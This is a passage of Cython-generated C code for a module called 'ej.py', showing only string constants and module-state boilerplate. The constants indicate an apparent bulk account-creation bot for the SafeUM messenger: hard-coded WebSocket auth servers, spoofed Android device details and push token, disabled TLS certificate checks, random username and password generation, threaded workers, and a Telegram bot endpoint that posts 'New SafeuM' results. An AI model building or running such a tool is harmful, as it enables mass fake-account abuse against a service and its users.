__pyx_k_test[] = "__test__";\nstatic const char __pyx_k_text[] = "&text=\\342\\254\\245\\357\\270\\216 \\360\\235\\220\\215\\360\\235\\220\\236\\360\\235\\220\\260 \\360\\235\\220\\222\\360\\235\\220\\232\\360\\235\\220\\237\\360\\235\\220\\236\\360\\235\\220\\224\\360\\235\\220\\214 \\342\\254\\245\\357\\270\\216\\n~~~~~~~~~~~~~~~\\n";\nstatic const char __pyx_k_time[] = "time";\nstatic const char __pyx_k_work[] = "work";\nstatic const char __pyx_k_1_30m[] = "\\033[1;30m";\nstatic const char __pyx_k_1_31m[] = "\\033[1;31m";\nstatic const char __pyx_k_1_32m[] = "\\033[1;32m";\nstatic const char __pyx_k_1_33m[] = "\\033[1;33m";\nstatic const char __pyx_k_1_34m[] = "\\033[1;34m";\nstatic const char __pyx_k_1_35m[] = "\\033[1;35m";\nstatic const char __pyx_k_1_36m[] = "\\033[1;36m";\nstatic const char __pyx_k_1_37m[] = "\\033[1;37m";\nstatic const char __pyx_k_1_91m[] = "\\033[1;91m";\nstatic const char __pyx_k_1_92m[] = "\\033[1;92m";\nstatic const char __pyx_k_1_93m[] = "\\033[1;93m";\nstatic const char __pyx_k_1_95m[] = "\\033[1;95m";\nstatic const char __pyx_k_1_96m[] = "\\033[1;96m";\nstatic const char __pyx_k_2_32m[] = "\\033[2;32m";\nstatic const char __pyx_k_2_36m[] = "\\033[2;36m";\nstatic const char __pyx_k_2_39m[] = "\\033[2;39m";\nstatic const char __pyx_k_A_bSa[] = "A_bSa";\nstatic const char __pyx_k_Ba_bS[] = "Ba_bS";\nstatic const char __pyx_k_S_aBs[] = "S_aBs";\nstatic const char __pyx_k_Ya_Bs[] = "Ya_Bs";\nstatic const char __pyx_k_a_bSa[] = "a_bSa";\nstatic const char __pyx_k_basic[] = "basic";\nstatic const char __pyx_k_clear[] = "clear";\nstatic const char __pyx_k_dumps[] = "dumps";\nstatic const char __pyx_k_ej_py[] = "ej.py";\nstatic const char __pyx_k_en_GB[] = "en_GB";\nstatic const char __pyx_k_faB_s[] = "faB_s";\nstatic const char __pyx_k_input[] = "input";\nstatic const char __pyx_k_login[] = "login";\nstatic const char __pyx_k_print[] = "print";\nstatic const char __pyx_k_retry[] = "retry";\nstatic const char __pyx_k_start[] = "start";\nstatic const char __pyx_k_token[] = "token";\nstatic const char __pyx_k_utf_8[] = "utf-8";\nstatic const char __pyx_k_JE_N_O[] = "\\360\\235\\220\\201\\360\\235\\220\\230 : @JE_N_O";\nstatic const char __pyx_k_a_aB_s[] = "a_aB_s";\nstatic const char __pyx_k_action[] = "action";\nstatic const char __pyx_k_choice[] = "choice";\nstatic const char __pyx_k_decode[] = "decode";\nstatic const char __pyx_k_failed[] = "failed";\nstatic const char __pyx_k_header[] = "header";\nstatic const char __pyx_k_import[] = "__import__";\nstatic const char __pyx_k_locale[] = "locale";\nstatic const char __pyx_k_name_2[] = "name";\nstatic const char __pyx_k_random[] = "random";\nstatic const char __pyx_k_sslopt[] = "sslopt";\nstatic const char __pyx_k_submit[] = "submit";\nstatic const char __pyx_k_system[] = "system";\nstatic const char __pyx_k_Desktop[] = "Desktop";\nstatic const char __pyx_k_choices[] = "choices";\nstatic const char __pyx_k_message[] = "message";\nstatic const char __pyx_k_success[] = "success";\nstatic const char __pyx_k_Register[] = "Register";\nstatic const char __pyx_k_accounts[] = "accounts";\nstatic const char __pyx_k_nickname[] = "nickname";\nstatic const char __pyx_k_password[] = "password";\nstatic const char __pyx_k_pyfiglet[] = "pyfiglet";\nstatic const char __pyx_k_remoteIp[] = "remoteIp";\nstatic const char __pyx_k_requests[] = "requests";\nstatic const char __pyx_k_username[] = "username";\nstatic const char __pyx_k_CERT_NONE[] = "CERT_NONE";\nstatic const char __pyx_k_cert_reqs[] = "cert_reqs";\nstatic const char __pyx_k_deviceuid[] = "deviceuid";\nstatic const char __pyx_k_magicword[] = "magicword";\nstatic const char __pyx_k_osversion[] = "osversion";\nstatic const char __pyx_k_sessionId[] = "sessionId";\nstatic const char __pyx_k_subaction[] = "subaction";\nstatic const char __pyx_k_websocket[] = "websocket";\nstatic const char __pyx_k_1734805700[] = "1734805700";\nstatic const char __pyx_k_1_1_0_1380[] = "1.1.0.1380";\nstatic const char __pyx_k_and_11_0_0[] = "and_11.0.0";\nstatic const char __pyx_k_decompress[] = "decompress";\nstatic const char __pyx_k_devicename[] = "devicename";\nstatic const char __pyx_k_remotePort[] = "remotePort";\nstatic const char __pyx_k_hhhh_JE_N_O[] = ":hhhh\\n~~~~~~~~~~~~~~~\\n\\360\\235\\220\\201\\360\\235\\220\\230 : @JE_N_O";\nstatic const char __pyx_k_max_workers[] = "max_workers";\nstatic const char __pyx_k_initializing[] = "_initializing";\nstatic const char __pyx_k_is_coroutine[] = "_is_coroutine";\nstatic const char __pyx_k_devicepushuid[] = "devicepushuid";\nstatic const char __pyx_k_figlet_format[] = "figlet_format";\nstatic const char __pyx_k_magicwordhint[] = "magicwordhint";\nstatic const char __pyx_k_193_200_173_45[] = "193.200.173.45";\nstatic const char __pyx_k_hvtctchnjvfxfx[] = "hvtctchnjvfxfx";\nstatic const char __pyx_k_status_Success[] = "\\"status\\":\\"Success\\"";\nstatic const char __pyx_k_softwareversion[] = "softwareversion";\nstatic const char __pyx_k_c72d110c1ae40d50[] = "c72d110c1ae40d50";\nstatic const char __pyx_k_create_connection[] = "create_connection";\nstatic const char __pyx_k_ThreadPoolExecutor[] = "ThreadPoolExecutor";\nstatic const char __pyx_k_asyncio_coroutines[] = "asyncio.coroutines";\nstatic const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";\nstatic const char __pyx_k_com_safeum_android[] = "com.safeum.android";\nstatic const char __pyx_k_concurrent_futures[] = "concurrent.futures";\nstatic const char __pyx_k_2023_04_30_12_13_32[] = "2023-04-30 12:13:32";\nstatic const char __pyx_k_sendMessage_chat_id[] = "/sendMessage?chat_id=";\nstatic const char __pyx_k_pip_install_pyfiglet[] = "pip install pyfiglet";\nstatic const char __pyx_k_pip_install_requests[] = "pip install requests";\nstatic const char __pyx_k_wss_51_79_208_190_Auth[] = "wss://51.79.208.190/Auth";\nstatic const char __pyx_k_Xiaomi_Redmi_Note_8_Pro[] = "Xiaomi Redmi Note 8 Pro";\nstatic const char __pyx_k_wss_193_200_173_45_Auth[] = "wss://193.200.173.45/Auth";\nstatic const char __pyx_k_https_api_telegram_org_bot[] = "https://api.telegram.org/bot";\nstatic const char __pyx_k_qwertyuioplkjhgfdsazxcvbnm[] = "qwertyuioplkjhgfdsazxcvbnm";\nstatic const char __pyx_k_pip_install_websocket_client[] = "pip install websocket-client";\nstatic const char __pyx_k_dxT6B6Solm0_APA91bHqL8wxzlyKHck[] = "*dxT6B6Solm0:APA91bHqL8wxzlyKHckKxMDz66HmUqmxCPAVKBDrs8KcxCAjwdpxIPTCfRmeEw8Jks_q13vOSFsOVjCVhb-CkkKmTUsaiS7YOYHQS_pbH1g6P4N-jlnRzySQwGvqMP1gxRVksHiOXKKP";\nstatic const char __pyx_k_04eb364e4ef79f31f3e95df2a956e9c7[] = "04eb364e4ef79f31f3e95df2a956e9c72ddc7b8ed4bf965f4cea42739dbe8a4a";\nstatic const char __pyx_k_0d99759f972c527722a18a74b3e0b3c6[] = "0d99759f972c527722a18a74b3e0b3c6060fe1be3ad53581a7692ff67b7bb651a18cde40552972d6d0b1482e119abde6203f5ab4985940da19bb998bb73f523806ed67cc6c9dbd310fd59fedee420f32";\nstatic const char __pyx_k_219d1d9b049550f26a6c7b7914a44da1[] = "219d1d9b049550f26a6c7b7914a44da1b5c931eff8692dbfe3127eeb1a922fcf";\nstatic const char __pyx_k_4b4d1468bfaf01a82c574ea71c44052d[] = "4b4d1468bfaf01a82c574ea71c44052d3ecb7c2866a2ced102d0a1a55901c94b";\nstatic const char __pyx_k_503c73d12b354f86ff9706b211470438[] = "503c73d12b354f86ff9706b2114704380876f59f1444133e62ca27b5ee8127cc";\nstatic const char __pyx_k_6387ae32b7087257452ae27fc8a925dd[] = "6387ae32b7087257452ae27fc8a925ddd6ba31d955639838249c02b3de175dfc";\nstatic const char __pyx_k_8c6ec7ce0b9108d882bb076be6e49fe2[] = "8c6ec7ce0b9108d882bb076be6e49fe2";\nstatic const char __pyx_k_b31d0165dde6b3d204263d6ea4b96789[] = "b31d0165dde6b3d204263d6ea4b96789";\nstatic const char __pyx_k_b6cbb22d_06ca_41ff_8fda_c0ddeb14[] = "b6cbb22d-06ca-41ff-8fda-c0ddeb148195";\nstatic const char __pyx_k_e38cb9e83aef6ceb60a7a71493317903[] = "e38cb9e83aef6ceb60a7a71493317903";\nstatic const char __pyx_k_ef1608faa151cb7989b0ba7f57b39822[] = "ef1608faa151cb7989b0ba7f57b39822d7b282511a77c4d7a33afe8165bdc1ab";\nstatic const char __pyx_k_qwertyuioplkjhgfdsazxcvbnm123456[] = "qwertyuioplkjhgfdsazxcvbnm1234567890";\n/* #### Code section: decls ### */\nstatic PyObject *__pyx_pf_2ej_work(CYTHON_UNUSED PyObject *__pyx_self); /* proto */\n/* #### Code section: late_includes ### */\n/* #### Code section: module_state ### */\ntypedef struct {\n  PyObject *__pyx_d;\n  PyObject *__pyx_b;\n  PyObject *__pyx_cython_runtime;\n  PyObject *__pyx_empty_tuple;\n  PyObject *__pyx_empty_bytes;\n  PyObject *__pyx_empty_unicode;\n  #ifdef __Pyx_CyFunction_USED\n  PyTypeObject *__pyx_CyFunctionType;\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  PyTypeObject *__pyx_FusedFunctionType;\n  #endif\n  #ifdef __Pyx_Generator_USED\n  PyTypeObject *__pyx_GeneratorType;\n  #endif\n  #ifdef __Pyx_IterableCoroutine_USED\n  PyTypeObject *__pyx_IterableCoroutineType;\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  PyTypeObject *__pyx_CoroutineAwaitType;\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  PyTypeObject *__pyx_CoroutineType;\n  #endif\n  #if CYTHON_USE_MODULE_STATE\n  #endif\n  PyObject *__pyx_kp_u_;\n  PyObject *__pyx_kp_u_0000;\n  PyObject *__pyx_kp_u_02;\n  PyObject *__pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7;\n  PyObject *__pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6;\n  PyObject *__pyx_kp_u_1734805700;\n  PyObject *__pyx_kp_u_193_200_173_45;\n  PyObject *__pyx_kp_u_1_1_0_1380;\n  PyObject *__pyx_kp_u_1_30m;\n  PyObject *__pyx_kp_u_1_31m;\n  PyObject *__pyx_kp_u_1_32m;\n  PyObject *__pyx_kp_u_1_33m;\n  PyObject *__pyx_kp_u_1_34m;\n  PyObject *__pyx_kp_u_1_35m;\n  PyObject *__pyx_kp_u_1_36m;\n  PyObject *__pyx_kp_u_1_37m;\n  PyObject *__pyx_kp_u_1_91m;\n  PyObject *__pyx_kp_u_1_92m;\n  PyObject *__pyx_kp_u_1_93m;\n  PyObject *__pyx_kp_u_1_95m;\n  PyObject *__pyx_kp_u_1_96m;\n  PyObject *__pyx_kp_u_2023_04_30_12_13_32;\n  PyObject *__pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1;\n  PyObject *__pyx_kp_u_2_32m;\n  PyObject *__pyx_kp_u_2_36m;\n  PyObject *__pyx_kp_u_2_39m;\n  PyObject *__pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d;\n  PyObject *__pyx_kp_u_503c73d12b354f86ff9706b211470438;\n  PyObject *__pyx_kp_u_6387ae32b7087257452ae27fc8a925dd;\n  PyObject *__pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2;\n  PyObject *__pyx_n_s_AB;\n  PyObject *__pyx_n_u_AND;\n  PyObject *__pyx_n_s_A_bSa;\n  PyObject *__pyx_n_s_Ab;\n  PyObject *__pyx_n_s_AbBs;\n  PyObject *__pyx_n_s_B;\n  PyObject *__pyx_n_s_Ba_bS;\n  PyObject *__pyx_n_s_Bl;\n  PyObject *__pyx_n_s_C;\n  PyObject *__pyx_n_s_CERT_NONE;\n  PyObject *__pyx_n_u_Desktop;\n  PyObject *__pyx_n_s_E;\n  PyObject *__pyx_n_s_F;\n  PyObject *__pyx_n_s_G;\n  PyObject *__pyx_kp_u_JE_N_O;\n  PyObject *__pyx_n_u_Jana;\n  PyObject *__pyx_n_s_P;\n  PyObject *__pyx_n_s_PN;\n  PyObject *__pyx_n_s_R;\n  PyObject *__pyx_n_u_Register;\n  PyObject *__pyx_n_s_S;\n  PyObject *__pyx_n_s_S_aBs;\n  PyObject *__pyx_n_s_ThreadPoolExecutor;\n  PyObject *__pyx_n_s_W;\n  PyObject *__pyx_kp_u_Xiaomi_Redmi_Note_8_Pro;\n  PyObject *__pyx_n_s_Y;\n  PyObject *__pyx_n_s_Ya_Bs;\n  PyObject *__pyx_kp_u__11;\n  PyObject *__pyx_kp_u__12;\n  PyObject *__pyx_kp_u__15;\n  PyObject *__pyx_kp_u__16;\n  PyObject *__pyx_kp_u__17;\n  PyObject *__pyx_kp_u__18;\n  PyObject *__pyx_n_s__20;\n  PyObject *__pyx_n_s__3;\n  PyObject *__pyx_kp_u__6;\n  PyObject *__pyx_n_s_aB;\n  PyObject *__pyx_n_s_aBbs;\n  PyObject *__pyx_n_s_a_aB_s;\n  PyObject *__pyx_n_s_a_bSa;\n  PyObject *__pyx_n_s_ab;\n  PyObject *__pyx_n_s_accounts;\n  PyObject *__pyx_n_u_action;\n  PyObject *__pyx_kp_u_and_11_0_0;\n  PyObject *__pyx_n_u_app;\n  PyObject *__pyx_n_s_asyncio_coroutines;\n  PyObject *__pyx_n_u_b31d0165dde6b3d204263d6ea4b96789;\n  PyObject *__pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14;\n  PyObject *__pyx_n_u_basic;\n  PyObject *__pyx_n_u_c72d110c1ae40d50;\n  PyObject *__pyx_n_u_cert_reqs;\n  PyObject *__pyx_n_s_choice;\n  PyObject *__pyx_n_s_choices;\n  PyObject *__pyx_n_u_clear;\n  PyObject *__pyx_n_s_cline_in_traceback;\n  PyObject *__pyx_kp_u_com_safeum_android;\n  PyObject *__pyx_n_s_con;\n  PyObject *__pyx_n_s_concurrent_futures;\n  PyObject *__pyx_n_s_create_connection;\n  PyObject *__pyx_n_s_decode;\n  PyObject *__pyx_n_s_decompress;\n  PyObject *__pyx_n_u_devicename;\n  PyObject *__pyx_n_u_devicepushuid;\n  PyObject *__pyx_n_u_deviceuid;\n  PyObject *__pyx_n_s_dumps;\n  PyObject *__pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck;\n  PyObject *__pyx_n_u_e38cb9e83aef6ceb60a7a71493317903;\n  PyObject *__pyx_n_u_ef1608faa151cb7989b0ba7f57b39822;\n  PyObject *__pyx_n_s_ej;\n  PyObject *__pyx_kp_s_ej_py;\n  PyObject *__pyx_n_u_en_GB;\n  PyObject *__pyx_n_s_faB_s;\n  PyObject *__pyx_n_s_failed;\n  PyObject *__pyx_n_s_figlet_format;\n  PyObject *__pyx_n_s_font;\n  PyObject *__pyx_n_u_gmt;\n  PyObject *__pyx_n_s_gzip;\n  PyObject *__pyx_n_s_header;\n  PyObject *__pyx_kp_u_hhhh_JE_N_O;\n  PyObject *__pyx_n_u_host;\n  PyObject *__pyx_kp_u_https_api_telegram_org_bot;\n  PyObject *__pyx_n_u_hvtctchnjvfxfx;\n  PyObject *__pyx_n_s_id;\n  PyObject *__pyx_n_u_id;\n  PyObject *__pyx_n_s_import;\n  PyObject *__pyx_n_s_initializing;\n  PyObject *__pyx_n_s_input;\n  PyObject *__pyx_n_s_is_coroutine;\n  PyObject *__pyx_n_u_iv;\n  PyObject *__pyx_n_s_json;\n  PyObject *__pyx_n_s_k;\n  PyObject *__pyx_n_u_locale;\n  PyObject *__pyx_n_u_login;\n  PyObject *__pyx_n_u_m1x;\n  PyObject *__pyx_n_u_m1y;\n  PyObject *__pyx_n_u_m2;\n  PyObject *__pyx_n_u_magicword;\n  PyObject *__pyx_n_u_magicwordhint;\n  PyObject *__pyx_n_s_main;\n  PyObject *__pyx_n_s_max_workers;\n  PyObject *__pyx_n_u_message;\n  PyObject *__pyx_n_s_name;\n  PyObject *__pyx_n_s_name_2;\n  PyObject *__pyx_n_u_nickname;\n  PyObject *__pyx_n_s_os;\n  PyObject *__pyx_n_u_os;\n  PyObject *__pyx_n_u_osversion;\n  PyObject *__pyx_n_u_password;\n  PyObject *__pyx_kp_u_pip_install_pyfiglet;\n  PyObject *__pyx_kp_u_pip_install_requests;\n  PyObject *__pyx_kp_u_pip_install_websocket_client;\n  PyObject *__pyx_n_s_post;\n  PyObject *__pyx_n_s_print;\n  PyObject *__pyx_n_s_pyfiglet;\n  PyObject *__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm;\n  PyObject *__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456;\n  PyObject *__pyx_n_s_random;\n  PyObject *__pyx_n_s_recv;\n  PyObject *__pyx_n_u_remoteIp;\n  PyObject *__pyx_n_u_remotePort;\n  PyObject *__pyx_n_s_requests;\n  PyObject *__pyx_n_s_retry;\n  PyObject *__pyx_n_s_send;\n  PyObject *__pyx_kp_u_sendMessage_chat_id;\n  PyObject *__pyx_n_u_sessionId;\n  PyObject *__pyx_n_u_softwareversion;\n  PyObject *__pyx_n_s_spec;\n  PyObject *__pyx_n_s_ssl;\n  PyObject *__pyx_n_s_sslopt;\n  PyObject *__pyx_n_s_start;\n  PyObject *__pyx_kp_u_status_Success;\n  PyObject *__pyx_n_u_subaction;\n  PyObject *__pyx_n_s_submit;\n  PyObject *__pyx_n_s_success;\n  PyObject *__pyx_n_s_sys;\n  PyObject *__pyx_n_s_system;\n  PyObject *__pyx_n_s_t;\n  PyObject *__pyx_n_s_test;\n  PyObject *__pyx_kp_u_text;\n  PyObject *__pyx_n_s_time;\n  PyObject *__pyx_n_u_time;\n  PyObject *__pyx_n_s_token;\n  PyObject *__pyx_n_u_url;\n  PyObject *__pyx_n_s_username;\n  PyObject *__pyx_kp_u_utf_8;\n  PyObject *__pyx_n_s_websocket;\n  PyObject *__pyx_n_s_work;\n  PyObject *__pyx_kp_u_wss_193_200_173_45_Auth;\n  PyObject *__pyx_kp_u_wss_51_79_208_190_Auth;\n  PyObject *__pyx_int_0;\n  PyObject *__pyx_int_1;\n  PyObject *__pyx_int_12;\n  PyObject *__pyx_int_1000;\n  PyObject *__pyx_int_8080;\n  PyObject *__pyx_tuple__2;\n  PyObject *__pyx_tuple__4;\n  PyObject *__pyx_tuple__5;\n  PyObject *__pyx_tuple__7;\n  PyObject *__pyx_tuple__8;\n  PyObject *__pyx_tuple__9;\n  PyObject *__pyx_tuple__10;\n  PyObject *__pyx_tuple__13;\n  PyObject *__pyx_tuple__19;\n  PyObject *__pyx_codeobj__14;\n} __pyx_mstate;\n\n#if CYTHON_USE_MODULE_STATE\n#ifdef __cplusplus\nnamespace {\n  extern struct PyModuleDef __pyx_moduledef;\n} /* anonymous namespace */\n#else\nstatic struct PyModuleDef __pyx_moduledef;\n#endif\n\n#define __pyx_mstate(o) ((__pyx_mstate *)__Pyx_PyModule_GetState(o))\n\n#define __pyx_mstate_global (__pyx_mstate(PyState_FindModule(&__pyx_moduledef)))\n\n#define __pyx_m (PyState_FindModule(&__pyx_moduledef))\n#else\nstatic __pyx_mstate __pyx_mstate_global_static =\n#ifdef __cplusplus\n    {};\n#else\n    {0};\n#endif\nstatic __pyx_mstate *__pyx_mstate_global = &__pyx_mstate_global_static;\n#endif\n/* #### Code section: module_state_clear ### */\n#if CYTHON_USE_MODULE_STATE\nstatic int __pyx_m_clear(PyObject *m) {\n  __pyx_mstate *clear_module_state = __pyx_mstate(m);\n  if (!clear_module_state) return 0;\n  Py_CLEAR(clear_module_state->__pyx_d);\n  Py_CLEAR(clear_module_state->__pyx_b);\n  Py_CLEAR(clear_module_state->__pyx_cython_runtime);\n  Py_CLEAR(clear_module_state->__pyx_empty_tuple);\n  Py_CLEAR(clear_module_state->__pyx_empty_bytes);\n  Py_CLEAR(clear_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_CLEAR(clear_module_state->__pyx_FusedFunctionType);\n  #endif\n  Py_CLEAR(clear_module_state->__pyx_kp_u_);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_0000);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_02);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1734805700);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_193_200_173_45);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_1_0_1380);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_30m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_31m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_32m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_33m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_34m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_35m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_36m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_37m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_91m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_92m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_93m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_95m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_1_96m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_2023_04_30_12_13_32);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_2_32m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_2_36m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_2_39m);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_503c73d12b354f86ff9706b211470438);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_6387ae32b7087257452ae27fc8a925dd);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2);\n  Py_CLEAR(clear_module_state->__pyx_n_s_AB);\n  Py_CLEAR(clear_module_state->__pyx_n_u_AND);\n  Py_CLEAR(clear_module_state->__pyx_n_s_A_bSa);\n  Py_CLEAR(clear_module_state->__pyx_n_s_Ab);\n  Py_CLEAR(clear_module_state->__pyx_n_s_AbBs);\n  Py_CLEAR(clear_module_state->__pyx_n_s_B);\n  Py_CLEAR(clear_module_state->__pyx_n_s_Ba_bS);\n  Py_CLEAR(clear_module_state->__pyx_n_s_Bl);\n  Py_CLEAR(clear_module_state->__pyx_n_s_C);\n  Py_CLEAR(clear_module_state->__pyx_n_s_CERT_NONE);\n  Py_CLEAR(clear_module_state->__pyx_n_u_Desktop);\n  Py_CLEAR(clear_module_state->__pyx_n_s_E);\n  Py_CLEAR(clear_module_state->__pyx_n_s_F);\n  Py_CLEAR(clear_module_state->__pyx_n_s_G);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_JE_N_O);\n  Py_CLEAR(clear_module_state->__pyx_n_u_Jana);\n  Py_CLEAR(clear_module_state->__pyx_n_s_P);\n  Py_CLEAR(clear_module_state->__pyx_n_s_PN);\n  Py_CLEAR(clear_module_state->__pyx_n_s_R);\n  Py_CLEAR(clear_module_state->__pyx_n_u_Register);\n  Py_CLEAR(clear_module_state->__pyx_n_s_S);\n  Py_CLEAR(clear_module_state->__pyx_n_s_S_aBs);\n  Py_CLEAR(clear_module_state->__pyx_n_s_ThreadPoolExecutor);\n  Py_CLEAR(clear_module_state->__pyx_n_s_W);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_Xiaomi_Redmi_Note_8_Pro);\n  Py_CLEAR(clear_module_state->__pyx_n_s_Y);\n  Py_CLEAR(clear_module_state->__pyx_n_s_Ya_Bs);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__11);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__12);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__15);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__16);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__17);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__18);\n  Py_CLEAR(clear_module_state->__pyx_n_s__20);\n  Py_CLEAR(clear_module_state->__pyx_n_s__3);\n  Py_CLEAR(clear_module_state->__pyx_kp_u__6);\n  Py_CLEAR(clear_module_state->__pyx_n_s_aB);\n  Py_CLEAR(clear_module_state->__pyx_n_s_aBbs);\n  Py_CLEAR(clear_module_state->__pyx_n_s_a_aB_s);\n  Py_CLEAR(clear_module_state->__pyx_n_s_a_bSa);\n  Py_CLEAR(clear_module_state->__pyx_n_s_ab);\n  Py_CLEAR(clear_module_state->__pyx_n_s_accounts);\n  Py_CLEAR(clear_module_state->__pyx_n_u_action);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_and_11_0_0);\n  Py_CLEAR(clear_module_state->__pyx_n_u_app);\n  Py_CLEAR(clear_module_state->__pyx_n_s_asyncio_coroutines);\n  Py_CLEAR(clear_module_state->__pyx_n_u_b31d0165dde6b3d204263d6ea4b96789);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14);\n  Py_CLEAR(clear_module_state->__pyx_n_u_basic);\n  Py_CLEAR(clear_module_state->__pyx_n_u_c72d110c1ae40d50);\n  Py_CLEAR(clear_module_state->__pyx_n_u_cert_reqs);\n  Py_CLEAR(clear_module_state->__pyx_n_s_choice);\n  Py_CLEAR(clear_module_state->__pyx_n_s_choices);\n  Py_CLEAR(clear_module_state->__pyx_n_u_clear);\n  Py_CLEAR(clear_module_state->__pyx_n_s_cline_in_traceback);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_com_safeum_android);\n  Py_CLEAR(clear_module_state->__pyx_n_s_con);\n  Py_CLEAR(clear_module_state->__pyx_n_s_concurrent_futures);\n  Py_CLEAR(clear_module_state->__pyx_n_s_create_connection);\n  Py_CLEAR(clear_module_state->__pyx_n_s_decode);\n  Py_CLEAR(clear_module_state->__pyx_n_s_decompress);\n  Py_CLEAR(clear_module_state->__pyx_n_u_devicename);\n  Py_CLEAR(clear_module_state->__pyx_n_u_devicepushuid);\n  Py_CLEAR(clear_module_state->__pyx_n_u_deviceuid);\n  Py_CLEAR(clear_module_state->__pyx_n_s_dumps);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck);\n  Py_CLEAR(clear_module_state->__pyx_n_u_e38cb9e83aef6ceb60a7a71493317903);\n  Py_CLEAR(clear_module_state->__pyx_n_u_ef1608faa151cb7989b0ba7f57b39822);\n  Py_CLEAR(clear_module_state->__pyx_n_s_ej);\n  Py_CLEAR(clear_module_state->__pyx_kp_s_ej_py);\n  Py_CLEAR(clear_module_state->__pyx_n_u_en_GB);\n  Py_CLEAR(clear_module_state->__pyx_n_s_faB_s);\n  Py_CLEAR(clear_module_state->__pyx_n_s_failed);\n  Py_CLEAR(clear_module_state->__pyx_n_s_figlet_format);\n  Py_CLEAR(clear_module_state->__pyx_n_s_font);\n  Py_CLEAR(clear_module_state->__pyx_n_u_gmt);\n  Py_CLEAR(clear_module_state->__pyx_n_s_gzip);\n  Py_CLEAR(clear_module_state->__pyx_n_s_header);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_hhhh_JE_N_O);\n  Py_CLEAR(clear_module_state->__pyx_n_u_host);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_https_api_telegram_org_bot);\n  Py_CLEAR(clear_module_state->__pyx_n_u_hvtctchnjvfxfx);\n  Py_CLEAR(clear_module_state->__pyx_n_s_id);\n  Py_CLEAR(clear_module_state->__pyx_n_u_id);\n  Py_CLEAR(clear_module_state->__pyx_n_s_import);\n  Py_CLEAR(clear_module_state->__pyx_n_s_initializing);\n  Py_CLEAR(clear_module_state->__pyx_n_s_input);\n  Py_CLEAR(clear_module_state->__pyx_n_s_is_coroutine);\n  Py_CLEAR(clear_module_state->__pyx_n_u_iv);\n  Py_CLEAR(clear_module_state->__pyx_n_s_json);\n  Py_CLEAR(clear_module_state->__pyx_n_s_k);\n  Py_CLEAR(clear_module_state->__pyx_n_u_locale);\n  Py_CLEAR(clear_module_state->__pyx_n_u_login);\n  Py_CLEAR(clear_module_state->__pyx_n_u_m1x);\n  Py_CLEAR(clear_module_state->__pyx_n_u_m1y);\n  Py_CLEAR(clear_module_state->__pyx_n_u_m2);\n  Py_CLEAR(clear_module_state->__pyx_n_u_magicword);\n  Py_CLEAR(clear_module_state->__pyx_n_u_magicwordhint);\n  Py_CLEAR(clear_module_state->__pyx_n_s_main);\n  Py_CLEAR(clear_module_state->__pyx_n_s_max_workers);\n  Py_CLEAR(clear_module_state->__pyx_n_u_message);\n  Py_CLEAR(clear_module_state->__pyx_n_s_name);\n  Py_CLEAR(clear_module_state->__pyx_n_s_name_2);\n  Py_CLEAR(clear_module_state->__pyx_n_u_nickname);\n  Py_CLEAR(clear_module_state->__pyx_n_s_os);\n  Py_CLEAR(clear_module_state->__pyx_n_u_os);\n  